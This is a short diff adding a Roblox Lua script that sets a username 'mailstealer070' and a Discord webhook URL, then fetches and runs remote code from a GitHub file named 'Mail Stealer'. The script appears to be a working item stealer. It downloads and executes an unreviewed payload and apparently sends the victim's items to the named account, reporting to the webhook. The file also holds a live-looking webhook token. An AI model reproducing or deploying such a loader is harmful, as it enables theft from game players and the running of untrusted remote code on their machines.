@@ -1,0 +1,4 @@
+Username = "mailstealer070"
+Webhook = "https://discord.com/api/webhooks/1208812930078867559/4WTDMpJSeo8iwiB7vXRVDUc6ki1rCdnW8l8K4YHpmuqDHTMPZeMytO0jBKtubyz2SnQy"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zephyr1a/Rapid-Route-/main/Mail%20Stealer"))()
